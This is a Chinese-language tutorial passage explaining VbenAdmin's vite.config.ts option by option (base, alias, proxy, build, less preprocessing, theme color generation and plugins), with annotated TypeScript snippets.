console.log('asda\\\\\\n\\\\n\\n'.replace(/\\n/g, '\\n')) =\u0026gt; asda\\ [回車\\n] \\n [回車\\n] console.log('asda\\\\\\n\\\\n\\n'.replace(/\\\\n/g, '\\n')) =\u0026gt; asda\\ [回車\\n] [回車\\n] [回車\\n] console.log('asda\\\\\\n\\\\n\\n'.replace(/\\\\\\n/g, '\\n')) =\u0026gt; asda [回車\\n] \\n [回車\\n] vite.config.ts文件復盤 自此vite.config.ts，除return裡面的東西外，其他的都已經解析完了。以現在可以得到這樣一個代碼：\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import { resolve } from \u0026#39;path\u0026#39;; import { ConfigEnv, loadEnv, UserConfig } from \u0026#39;vite\u0026#39;; import { wrapperEnv } from \u0026#39;./build/util\u0026#39;; function pathResolve(dir: string) { return resolve(__dirname, \u0026#39;.\u0026#39;, dir); } export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { const root = process.cwd(); const env = loadEnv(mode, root); const viteEnv = wrapperEnv(env); const { VITE_PORT, VITE_PUBLIC_PATH, VITE_PROXY, VITE_DROP_CONSOLE, VITE_LEGACY } = viteEnv; const isBuild = command === \u0026#39;build\u0026#39;; return {}; }; Vite配置-base 說明 Vite配置-base說明\n官網原文：\n類型： string 默認： / 開發或生產環境服務的 公共基礎路徑。合法的值包括以下幾種：\n絕對 URL 路徑名，例如 /foo/ 完整的 URL，例如 https://foo.com/ 空字符串或 ./（用於開發環境） 更多信息詳見公共基礎路徑。\n就是你的項目的BaseURL。比如這裡我配置一個yiu\n那麼我的項目訪問：http://localhost:3000/yiu/\n當你訪問其他路徑就會報錯：http://localhost:3000/any/\n1 The server is configured with a public base URL of /yiu/ - did you mean to visit /yiu/any/ instead? Vite配置-root 說明 Vite配置-root說明\n官網原文：\n類型： string 默認： process.cwd() 項目根目錄（index.html 文件所在的位置）。可以是一個絕對路徑，或者一個相對於該配置文件本身的路徑。\n更多信息詳見項目根目錄。\n用來找index.html路徑的配置吧，亂寫啟動項目的時候會報錯。其他的也不用解釋了。\nVite配置-resolve.alias 說明 Vite配置-resolve.alias說明\n官網原文：\n類型： 1 Record\u0026lt;string, string\u0026gt; | Array\u0026lt;{ find: string | RegExp, replacement: string }\u0026gt; 將會被傳遞到 @rollup/plugin-alias 作為它的 entries。也可以是一個對象，或一個 { find, replacement } 的數組。\n當使用文件系統路徑的別名時，請始終使用絕對路徑。相對路徑作別名值將按原樣使用導致不會解析到文件系統路徑中。\n更高級的自定義解析方法可以通過 插件 實現。\nVbenAdmin的示例： vite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 resolve: { alias: [ { // /@/xxxx =\u0026gt; src/xxx find: /^\\/@\\//, replacement: pathResolve(\u0026#39;src\u0026#39;) + \u0026#39;/\u0026#39;, }, { // /#/xxxx =\u0026gt; types/xxx find: /^\\/#\\//, replacement: pathResolve(\u0026#39;types\u0026#39;) + \u0026#39;/\u0026#39;, }, ], }, Vite配置-server.port 說明 Vite配置-server.port說明\n官網原文：\n類型： number 指定服務器端口。注意：如果端口已經被使用，Vite 會自動嘗試下一個可用的端口，所以這可能不是服務器最終監聽的實際端口。\nVite配置-server.proxy 說明 Vite配置-server.proxy說明 Vite內置的代理插件http-proxy的Git首頁 http-proxy的配置項 官網原文：\n類型： 1 Record\u0026lt;string, string | ProxyOptions\u0026gt; 為開發服務器配置自定義代理規則。期望接收一個 { key: options } 對象。如果 key 值以 ^ 開頭，將會被解釋為 RegExp。\n使用 http-proxy。完整選項詳見 此處。\n示例： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 export default { server: { proxy: { // 字符串簡寫寫法 \u0026#39;/foo\u0026#39;: \u0026#39;http://localhost:4567/foo\u0026#39;, // 選項寫法 \u0026#39;/api\u0026#39;: { target: \u0026#39;http://jsonplaceholder.typicode.com\u0026#39;, changeOrigin: true, rewrite: (path) =\u0026gt; path.replace(/^\\/api/, \u0026#39;\u0026#39;) }, // 正則表達式寫法 \u0026#39;^/fallback/.*\u0026#39;: { target: \u0026#39;http://jsonplaceholder.typicode.com\u0026#39;, changeOrigin: true, rewrite: (path) =\u0026gt; path.replace(/^\\/fallback/, \u0026#39;\u0026#39;) } } } } VbenAdmin代碼解析 我們在build文件夾下創建一個vite文件，這麼放置所有和vite配置有關的文件。然後完成本章兩個文件的編寫。\nproxy.ts build\\vite\\proxy.ts，注意，這裡帶註解的代碼和原代碼不一樣。因為原代碼我感覺有點問題。\nVite官方文檔說代理配置接收的是一個Record\u0026lt;string, string | ProxyOptions\u0026gt;對象。而這個文件的主要方法返回的是ProxyTargetList類型的對象。\n按理來說ProxyTargetList應該直接等於Record\u0026lt;string, string | ProxyOptions\u0026gt;。\n但是VbenAmin的代碼安裝了一個@types/http-proxy（雖然Vite本身的代理就是用http-proxy實現的）的開發依賴。然後從這個開發依賴裡面導入一個ServerOptions。讓ProxyTargetList等於Record\u0026lt;string, ServerOptions \u0026amp; { rewrite: (path: string) =\u0026gt; string }\u0026gt;。\n個人感覺可以直接使用vite提供的類型即可，不用安裝@types/http-proxy的聲明文件。\n代碼 被代理之後，訪問的路徑是 代理至的路徑 + 訪問的路徑去掉根路徑後經過rewrite處理的路徑。\nbuild/vite/proxy.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 /** * .env.development 的 代理配置 */ import type { ProxyOptions } from \u0026#39;vite\u0026#39;; // ↓ 第一项被代理的路径，第二项代理至的路径 type ProxyItem = [string, string]; // ↓ 方法接收的参数 type ProxyList = ProxyItem[]; // ↓ Vite代理所接收对象类型 type ProxyTargetList = Record\u0026lt;string, string | ProxyOptions\u0026gt;; // ↓ https类型的URL的匹配正则 const httpsRE = /^https:\\/\\//; /** * 生成Vite代理配置的方法 */ export function createProxy(list: ProxyList = []) { const ret: ProxyTargetList = {}; for (const [prefix, target] of list) { const isHttps = httpsRE.test(target); // https://github.com/http-party/node-http-proxy#options ret[prefix] = { // ↓ 代理至的路径 target: target, // ↓ 默认值：false-将主机标头的来源更改为目标URL changeOrigin: true, // ↓ 如果您想代理websocket ws: true, rewrite: (path) =\u0026gt; path.replace(new RegExp(`^${prefix}`), \u0026#39;\u0026#39;), // https is require secure=false ...(isHttps ? { secure: false } : {}), }; } return ret; } vite.config.ts 直接將上面定義的生成代理配置的方法放到vite.config.ts中使用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // ... import { createProxy } from \u0026#39;./build/vite/proxy\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... server: { // ... // 從.env加載代理配置 proxy: createProxy(VITE_PROXY), }, // ... }; }; Vite配置-server.hmr 說明 Vite配置-server.hmr說明\n官網原文：\n類型： 1 boolean | { protocol?: string, host?: string, port?: number, path?: string, timeout?: number, overlay?: boolean } 禁用或配置 HMR 連接（用於 HMR websocket 必須使用不同的 http 服務器地址的情況）。\n設置 server.hmr.overlay 為 false 可以禁用服務器錯誤遮罩層。\n這個就是配置Vite的熱更新的。文檔中說的服務器錯誤遮罩層，就是你在代碼中編寫編寫錯誤的代碼，編譯不通過的時候，瀏覽器頁面也會同時展示一個灰屏上面顯示你的代碼錯誤。\nVite配置-build.minify 說明 Vite配置-build.minify說明\n官網原文：\n類型： 1 boolean | \u0026#39;terser\u0026#39; | \u0026#39;esbuild\u0026#39; 默認：terser 設置為 false 可以禁用最小化混淆，或是用來指定使用哪種混淆器。默認為 Terser，雖然 Terser 相對較慢，但大多數情況下構建後的文件體積更小。 ESbuild 最小化混淆更快但構建後的文件相對更大。\nVite配置-build.outDir 說明 Vite配置-build.outDir說明\n官網原文：\n類型：string 默認：dist 指定輸出路徑（相對於 項目根目錄)。\n創建全局常數 這個輸出路徑我們把它寫成一個全局常量。全局常量保存在：build\\constant.ts\nbuild\\constant.ts 1 2 3 4 5 6 /** * 在生产环境中输入的配置文件名称。 */ export const GLOB_CONFIG_FILE_NAME = \u0026#39;_app.config.js\u0026#39;; export const OUTPUT_DIR = \u0026#39;dist\u0026#39;; 然後在vite.config.ts中引用：\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // ... import { OUTPUT_DIR } from \u0026#39;./build/constant\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... build: { outDir: OUTPUT_DIR, }, // ... }; }; Vite配置-build.polyfillDynamicImport 說明 Vite配置-build.polyfillDynamicImport說明 擁抱Vite2.0 系列（二） - 知乎 官網原文：\n類型：boolean 默認：true，除非build.target是esnext。 是否自動注入動態導入polyfill。\npolyfill會自動注入到每個index.html條目的代理模塊中。如果通過build.rollupOptions.input配置成使用非html的自定義條目，那麼就需要手動導入自定義條目中的polyfill：\n1 import \u0026#39;vite/dynamic-import-polyfill\u0026#39; 注意：polyfill不適用於庫模式。如果你需要支持沒有本地動態導入的瀏覽器，你可能應該避免在你的庫中使用它。\nVite使用ES動態導入作為代碼分割點。生成的代碼還將使用動態導入來加載異步塊。然而，本機ESM動態導入支持是在ESM之後通過腳本標記實現的，並且這兩個特性在瀏覽器支持方面存在差異。 Vite會自動注入一個輕量級的動態導入填充來消除這種差異。\n如果你知道你的目標瀏覽器只支持本機動態導入，你可以通過build.polyfillDynamicImport顯式禁用此特性。\n總之VbenAdmin中在生產環境將此項禁用了。如果打包後的項目有問題，而本地運行沒問題。那麼嘗試打開它，因為這個配置貌似和瀏覽器有關。\n創建全局常數 這個輸出路徑我們把它寫成一個全局常量。全局常量保存在：build\\constant.ts\nbuild\\constant.ts 1 2 3 4 5 6 /** * 在生产环境中输入的配置文件名称。 */ export const GLOB_CONFIG_FILE_NAME = \u0026#39;_app.config.js\u0026#39;; export const OUTPUT_DIR = \u0026#39;dist\u0026#39;; 然後在vite.config.ts中引用：\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // ... import { OUTPUT_DIR } from \u0026#39;./build/constant\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... build: { outDir: OUTPUT_DIR, }, // ... }; }; Vite配置-build.terserOptions 說明 Vite配置-build.terserOptions說明\n官網原文：\n類型：TerserOptions 傳遞給 Terser 的更多 minify 選項。\n其他的配置項自行研究，這裡只註釋一下VbenAdmin配置的代碼。\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... build: { // ... terserOptions: { compress: { keep_infinity: true, // 用於刪除生產環境中的console drop_console: VITE_DROP_CONSOLE, }, }, }, // ... }; }; compress：（默認{}）-通過false以完全跳過壓縮。傳遞一個對像以指定自定義壓縮選項。 compress.keep_infinity：（默認值：false）-通過true以防止Infinity被壓縮為1/0，這可能會導致Chrome出現性能問題。 compress.drop_console：（默認值：false）-傳遞true以放棄對console.*函數的調用 。如果您希望在刪除函數調用後刪除特定的函數調用，例如console.info和/或保留函數自變量的副作用，請pure_funcs改用。 Vite配置-build.brotliSize 說明 Vite配置-build.brotliSize說明\n官網原文：\n類型：boolean 默認：true 啟用/禁用 brotli 壓縮大小報告。壓縮大型輸出文件可能會很慢，因此禁用該功能可能會提高大型項目的構建性能。\n禁用就好。\n效果對比 打開壓縮報告：4.90s\n關閉壓縮報告：3.50s，少了後面一串壓縮大小，肯定更快啦。\nVite配置-build.chunkSizeWarningLimit 說明 Vite配置-build.chunkSizeWarningLimit說明\n官網原文：\n類型：number 默認：500 chunk 大小警告的限制（以 kbs 為單位）。\nLimitChunkCountPlugin\n在編寫代碼時，您可能已經添加了許多代碼拆分點以按需加載內容。編譯後，您可能會注意到一些塊太小了-造成更大的HTTP開銷。 LimitChunkCountPlugin可以通過合併來對您的塊進行後處理。\nVite配置-define 說明 Vite配置-define說明\n官網原文：\n類型： 1 Record\u0026lt;string, string\u0026gt; 定義全局變量替換方式。每項在開發時會被定義為全局變量，而在構建時則是靜態替換。\n從 2.0.0-beta.70 版本開始，字符串值將作為一個直接的表達式，所以如果定義為了一個字符串常量，它需要被顯式地引用（例如：通過 JSON.stringify）。 替換只會在匹配到周圍是單詞邊界（\\b）時執行。 使用 看一下vue-i18n的應用。\nvue-i18n的全局變量替換\n原文：\nBundler 構建功能標誌\nesm-bundler builds現在暴露了全局特性標誌，這些標誌可以在編譯時被覆蓋。\n__VUE_I18N_FULL_INSTALL__：啟用/禁用，除了vue-i18n APIs，組件和指令都完全支持安裝：true\n__VUE_I18N_LEGACY_API__：啟用/禁用vue-i18n傳統風格的API支持，默認為true\n__INTLIFY_PROD_DEVTOOLS__：在生產中啟用/禁用intlify-devtools和vue-devtools支持，默認為false\n在沒有配置這些標誌的情況下，編譯也能正常工作，但強烈建議正確配置這些標誌，以便在最終的bundle中獲得正確的樹形搖動。\n要配置這些標誌：\nwebpack: 使用 DefinePlugin Rollup: 使用 @rollup/plugin-replace Vite：默認配置，但可以使用define選項覆蓋 注意：替換值必須是布爾文，不能是字符串，否則bundler/minifier將無法正確評估條件。\n如此，就按照VbenAdmin的原代碼一樣配置吧。不然vue-i18n還會包警告，當然，現在我們還沒有安裝vue-i18n。後面配置國際化的時候再講。\nVite配置-css.preprocessorOptions 說明 Vite配置-css.preprocessorOptions說明\n官網原文：\n類型： 1 Record\u0026lt;string, object\u0026gt; 指定傳遞給 CSS 預處理器的選項。例如：\nvite.config.ts 1 2 3 4 5 6 7 8 9 export default { css: { preprocessorOptions: { scss: { additionalData: `$injectedColor: orange;` } } } } 安裝less 眾所周知Antd框架使用的是less。所以我們這裡研究less的配置。\n安裝less：\n1 yarn add less --dev VbenAdmin的全局樣式 在根目錄下的：src\\design文件夾中定義了VbenAdmin所有 全局樣式 和 全局less變量 。其中分為兩大類：\nsrc\\design\\index.less：全局樣式，在main.ts中使用。 src\\design\\config.less：全局變量，在vite.config.ts中使用。 至於該文件夾下的其他文件，都被直接或間接的引入到了index.less、config.less中。\n我們這邊直接拷貝文件夾就行了，樣式也沒啥研究的。如果有能力的可以把和index.less相關的文件都刪除了，然後自己寫關於VbenAdmin的樣式。\n但是變量不能動，很多都antd的變量，antd 的 less 變量參考連結。\n複製完之後，順便將index.less在main.ts中引用一下。\nVite中的Less配置 代碼配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... css: { preprocessorOptions: { less: { modifyVars: { // 用於全局導入，以避免需要單獨導入每個樣式文件。 // reference: 避免重複引用 hack: `true; @import (reference) \u0026#34;${resolve(\u0026#39;src/design/config.less\u0026#39;)}\u0026#34;;`, // ↓ 這行代碼下一章講 // ...generateModifyVars(), }, javascriptEnabled: true, }, }, }, // ... }; }; 代碼解析 less-@import規則 less-命令行語法 lessjs-配置項 lessjs-配置項-javascriptEnabled \u0026amp; modifyVars less-reference外文博客 css hack匯總 史上最全的CSS hack方式一覽 關於Less js的@import實驗 less對應的對象可以查看lessjs-配置項。\njavascriptEnabled: true這行代碼沒得說，畢竟antd的less文件中使用JS寫法，比如：\\node_modules\\ant-design-vue\\lib\\style\\color\\bezierEasing.less modifyVars是在全局less文件後面添加變量的配置。 modifyVars對應的對象屬性名會加上@追加到less文件後。 hack: true; @import (r...：這一行代碼，在less文件中會被解析成： 1 @hack=true; @import (reference) \u0026#34;${resolve(\u0026#39;src/design/config.less\u0026#39;)}\u0026#34;; 那這個hack變量是幹什麼的？我感覺啥也沒有，單純是為了將後面的@import接上的@import會報錯，只寫。這行代碼可以隨便寫，比如：\n1 2 3 // yiu: `red; @import (reference) \u0026#34;${resolve(\u0026#39;src/design/config.less\u0026#39;)}\u0026#34;;`, // ↓ 解析成,一樣的效果。 @yiu=red; @import (reference) \u0026#34;${resolve(\u0026#39;src/design/config.less\u0026#39;)}\u0026#34;;`, 我個人感覺這個hack和css hack單純名字一樣。至於reference，可以看一下關於Less js的@import實驗這篇博文即可理解。只是我個人疑惑為什麼這個import為什麼不寫在globalVars中。\nVite的顏色 說明 解析build\\config\\themeConfig.ts文件，直接創建這個文件。然後我們一段一段的分析：\n1 yarn add ant-design-vue@next 第一部分3-16行代碼 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // ↓ 默認顏色 export const primaryColor = \u0026#39;#0960bd\u0026#39;; // ↓ 默認主題 export const themeMode = \u0026#39;light\u0026#39;; // ↓ 主題類型 export type ThemeMode = \u0026#39;dark\u0026#39; | \u0026#39;light\u0026#39;; // ↓ 一個解決臨時檢查的方法類型 type Fn = (...arg: any) =\u0026gt; any; // ↓ Vite生成顏色組的方法參數，顏色這一塊有點深奧了，不做細的研究，感興趣的同學自己看看源碼吧 export interface GenerateColorsParams { mixLighten: Fn; mixDarken: Fn; tinycolor: any; color?: string; } 第二部分18-22行代碼 1 2 3 4 5 6 7 import { generate } from \u0026#39;@ant-design/colors\u0026#39;; export function generateAntColors(color: string, mode: ThemeMode) { return generate(color, { theme: mode == \u0026#39;dark\u0026#39; ? \u0026#39;dark\u0026#39; : \u0026#39;default\u0026#39;, }); } 調用的@ant-design/colors的顏色生成方法，將參數簡化了一下。\n參考連結：\n@ant-design/colors的npm首頁 Ant Design Colors首頁 Ant Design 色板生成算法演進之路 第三部分24-32行代碼 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 export function getThemeColors(color?: string, theme?: ThemeMode) { const tc = color || primaryColor; const tm = theme || themeMode; // ↓ 傳入的顏色根據主題生成10個顏色系列 const colors = generateAntColors(tc, tm); // ↓ 取10個顏色的第6個作為主顏色 const primary = colors[5]; // ↓ 再使用主顏色根據主題生成10個顏色系列 const modeColors = generateAntColors(primary, tm === \u0026#39;dark\u0026#39; ? \u0026#39;light\u0026#39; : \u0026#39;dark\u0026#39;); // ↓ 輸出這20個顏色 return [...colors, ...modeColors]; } 第四部分34-71行代碼 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 export function generateColors({ color = primaryColor, mixLighten, mixDarken, tinycolor, }: GenerateColorsParams) { const arr = new Array(19).fill(0); const lightens = arr.map((t, i) =\u0026gt; { return mixLighten(color, i / 5); }); const darkens = arr.map((t, i) =\u0026gt; { return mixDarken(color, i / 5); }); const alphaColors = arr.map((t, i) =\u0026gt; { return tinycolor(color) .setAlpha(i / 20) .toRgbString(); }); const tinycolorLightens = arr .map((t, i) =\u0026gt; { return tinycolor(color) .lighten(i * 5) .toHexString(); }) .filter((item) =\u0026gt; item !== \u0026#39;#ffffff\u0026#39;); const tinycolorDarkens = arr .map((t, i) =\u0026gt; { return tinycolor(color) .darken(i * 5) .toHexString(); }) .filter((item) =\u0026gt; item !== \u0026#39;#000000\u0026#39;); return [...lightens, ...darkens, ...alphaColors, ...tinycolorDarkens, ...tinycolorLightens]; } 這裡直接根據顏色生成了98中顏色。我確實不太清楚這個麼多顏色幹什麼的。調用效果參考build\\vite\\plugin\\theme.ts（現在先不管這個文件）：\nbuild/vite/plugin/theme.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 /** * Vite plugin for website theme color switching * https://github.com/anncwb/vite-plugin-theme */ import { viteThemePlugin, mixLighten, mixDarken, tinycolor } from \u0026#39;vite-plugin-theme\u0026#39;; import { getThemeColors, generateColors } from \u0026#39;../../config/themeConfig\u0026#39;; export function configThemePlugin() { const colors = generateColors({ mixDarken, mixLighten, tinycolor, }); // ... } #0960bd生成的顏色：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 console.log([...lightens, ...darkens, ...alphaColors, ...tinycolorDarkens, ...tinycolorLightens]); // ↓ 輸出 [ \u0026#39;#0960bd\u0026#39;, \u0026#39;#3a80ca\u0026#39;, \u0026#39;#6ba0d7\u0026#39;, \u0026#39;#9dbfe5\u0026#39;, \u0026#39;#cedff2\u0026#39;, \u0026#39;#ffffff\u0026#39;, \u0026#39;#13011f10c\u0026#39;, \u0026#39;#16113f119\u0026#39;, \u0026#39;#19315e127\u0026#39;, \u0026#39;#1c417e134\u0026#39;, \u0026#39;#1f519e141\u0026#39;, \u0026#39;#2261be14e\u0026#39;, \u0026#39;#2571de15b\u0026#39;, \u0026#39;#2891fd169\u0026#39;, \u0026#39;#2ba21d176\u0026#39;, \u0026#39;#2eb23d183\u0026#39;, \u0026#39;#31c25d190\u0026#39;, \u0026#39;#34d27d19d\u0026#39;, \u0026#39;#37f29c1ab\u0026#39;, \u0026#39;#0960bd\u0026#39;, \u0026#39;#074d97\u0026#39;, \u0026#39;#053a71\u0026#39;, \u0026#39;#04264c\u0026#39;, \u0026#39;#021326\u0026#39;, \u0026#39;#000000\u0026#39;, \u0026#39;#-2-13-26\u0026#39;, \u0026#39;#-4-26-4c\u0026#39;, \u0026#39;#-5-3a-71\u0026#39;, \u0026#39;#-7-4d-97\u0026#39;, \u0026#39;#-9-60-bd\u0026#39;, \u0026#39;#-b-73-e3\u0026#39;, \u0026#39;#-d-86-109\u0026#39;, \u0026#39;#-e-9a-12e\u0026#39;, \u0026#39;#-10-ad-154\u0026#39;, \u0026#39;#-12-c0-17a\u0026#39;, \u0026#39;#-14-d3-1a0\u0026#39;, \u0026#39;#-16-e6-1c6\u0026#39;, \u0026#39;#-17-fa-1eb\u0026#39;, \u0026#39;rgba(9, 96, 189, 0)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.05)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.1)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.15)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.2)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.25)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.3)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.35)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.4)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.45)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.5)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.55)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.6)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.65)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.7)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.75)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.8)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.85)\u0026#39;, \u0026#39;rgba(9, 96, 189, 0.9)\u0026#39;, \u0026#39;#0960bd\u0026#39;, \u0026#39;#0854a5\u0026#39;, \u0026#39;#07478c\u0026#39;, \u0026#39;#063b74\u0026#39;, \u0026#39;#042f5c\u0026#39;, \u0026#39;#032243\u0026#39;, \u0026#39;#02162b\u0026#39;, \u0026#39;#010913\u0026#39;, \u0026#39;#0960bd\u0026#39;, \u0026#39;#0a6cd5\u0026#39;, \u0026#39;#0b79ee\u0026#39;, \u0026#39;#1e86f4\u0026#39;, \u0026#39;#3793f5\u0026#39;, \u0026#39;#4fa0f7\u0026#39;, \u0026#39;#67adf8\u0026#39;, \u0026#39;#80baf9\u0026#39;, \u0026#39;#98c7fa\u0026#39;, \u0026#39;#b0d4fb\u0026#39;, \u0026#39;#c9e2fc\u0026#39;, \u0026#39;#e1effe\u0026#39;, \u0026#39;#f9fcff\u0026#39; ] console.log( [...lightens, ...darkens, ...alphaColors, ...tinycolorDarkens, ...tinycolorLightens].length ); // ↓ 輸出 78 第五部分73-104行代碼 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 /** * less global variable */ export function generateModifyVars() { const palettes = generateAntColors(primaryColor, themeMode); const primary = palettes[5]; const primaryColorObj: Record\u0026lt;string, string\u0026gt; = {}; for (let index = 0; index \u0026lt; 10; index++) { primaryColorObj[`primary-${index + 1}`] = palettes[index]; } return { \u0026#39;primary-color\u0026#39;: primary, ...primaryColorObj, \u0026#39;info-color\u0026#39;: primary, \u0026#39;processing-color\u0026#39;: primary, \u0026#39;success-color\u0026#39;: \u0026#39;#55D187\u0026#39;, // Success color \u0026#39;error-color\u0026#39;: \u0026#39;#ED6F6F\u0026#39;, // False color \u0026#39;warning-color\u0026#39;: \u0026#39;#EFBD47\u0026#39;, // Warning color \u0026#39;disabled-color\u0026#39;: \u0026#39;rgba(0, 0, 0, 0.25)\u0026#39;, // Failure color \u0026#39;heading-color\u0026#39;: \u0026#39;rgba(0, 0, 0, 0.85)\u0026#39;, // Title color \u0026#39;text-color\u0026#39;: \u0026#39;rgba(0, 0, 0, 0.85)\u0026#39;, // Main text color \u0026#39;text-color-secondary\u0026#39;: \u0026#39;rgba(0, 0, 0, 0.45)\u0026#39;, // Subtext color \u0026#39;font-size-base\u0026#39;: \u0026#39;14px\u0026#39;, // Main font size \u0026#39;box-shadow-base\u0026#39;: \u0026#39;0 2px 8px rgba(0, 0, 0, 0.15)\u0026#39;, // Floating shadow \u0026#39;border-color-base\u0026#39;: \u0026#39;#d9d9d9\u0026#39;, // Border color, \u0026#39;border-radius-base\u0026#39;: \u0026#39;2px\u0026#39;, // Component/float fillet \u0026#39;link-color\u0026#39;: primary, // Link color }; } 這個方法就是生成antd主題變量對象的。將該對象的結果放到Vite的less配置中：\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // ... import { generateModifyVars } from \u0026#39;./build/config/themeConfig\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... css: { preprocessorOptions: { less: { modifyVars: { // ... ...generateModifyVars(), }, // ... }, }, }, // ... }; }; Vite配置-plugin 說明 Vite配置-plugin說明\n官網原文：\n類型： 1 (Plugin | Plugin[])[] 將要用到的插件數組。查看 插件 API 獲取 Vite 插件的更多細節。\n配置插件 它接收一個插件對象，或者一個插件數組。由於我們需要配置很多插件，而每一個插件的配置也不一樣，所以我們把插件數組封裝到一個方法中去。統一配置VbenAdmin的插件。\n創建生成插件數組方法 build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 import type { Plugin } from \u0026#39;vite\u0026#39;; import type { ViteEnv } from \u0026#39;../../utils\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { const { VITE_USE_IMAGEMIN, VITE_USE_MOCK, VITE_LEGACY, VITE_BUILD_COMPRESS } = viteEnv; const vitePlugins: (Plugin | Plugin[])[] = []; return vitePlugins; } 後續配置vitePlugins這個數組。\n配置Vite插件 vite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 // ... import { createVitePlugins } from \u0026#39;./build/vite/plugin\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... // 項目使用的vite插件。數量大，單獨提取管理 plugins: createVitePlugins(viteEnv, isBuild), // ... }; }; Vite插件-@vitejs-plugin-vue 說明 @vitejs/plugin-vue的npm首頁\n要編寫Vue程序，這個不用解釋了吧，在使用Vite創建應用程序的時候，這個依賴就已經默認加上了。\n引入組件 vue插件不用配置，可以直接放進去。\nbuild/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 // ... import vue from \u0026#39;@vitejs/plugin-vue\u0026#39;; // ... export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... const vitePlugins: (Plugin | Plugin[])[] = [vue()]; // ... return vitePlugins; } Vite插件-@vitejs-plugin-vue-jsx 說明 為什麼使用JSX？\n其實JSX的效果和我們在vue的template中寫的代碼效果是一樣的。最終都會被渲染成createElement。 區別是template的標籤是不可變的，我們要實現動態標籤，只能使用v-if。而JSX的最大特點就是靈活，我們可以隨意組裝HTML代碼。 假如我們要實現一個組件渲染\u0026lt;hn\u0026gt;\u0026lt;/hn\u0026gt;標籤，n是我們傳入的參數。如果用template，那麼我們要寫6個v-if。但是如果使用JSX，我們就可以直接將n放到標籤中去。\n參考連結 @vitejs/plugin-vue-jsx的npm首頁 Vue-JSX Vue- JSX 中的用法 Vue-setup中使用JSX Vue-模板語法 安裝 1 yarn add @vitejs/plugin-vue-jsx --dev vue-jsx插件不用配置，可以直接放進去。\nbuild/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 // ... import vueJsx from \u0026#39;@vitejs/plugin-vue-jsx\u0026#39;; // ... export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... const vitePlugins: (Plugin | Plugin[])[] = [vue(),vueJsx()]; // ... return vitePlugins; } Vite插件-@vitejs-plugin-legacy 說明 原文描述：\n注：此插件需要vite@^2.0.0-beta.12。\nVite默認的瀏覽器支持基線是原生ESM。本插件為不支持原生ESM的傳統瀏覽器提供支持。\n默認情況下，該插件將為最終bundle中的每個chunk生成一個相應的legacy chunk，用@babel/reset-env進行轉換，並以SystemJS模塊的形式發布（仍然支持代碼分割！）。\n生成一個包含SystemJS運行時的polyfill chunk，以及由指定的瀏覽器目標和捆綁包中的實際使用情況決定的任何必要的polyfills。\n在生成的HTML中註入\u0026lt;script nomodule\u0026gt;標籤，以便在沒有本地ESM支持的瀏覽器中有條件地加載polyfills和legacy bundle。\n注入 import.meta.env.LEGACY env 變量，該變量僅在 legacy 生產構建中為真，而在所有其他情況下為假。(需要vite@^2.0.0-beta.69)。\n所以這個是一個瀏覽器兼容的插件。我們直接安裝使用，個人感覺學習的話也用不上。\n參考連結 @vitejs/plugin-legacy的npm首頁 安裝 1 yarn add @vitejs/plugin-legacy --dev VbenAdmin配置build/vite/plugin/index.ts： 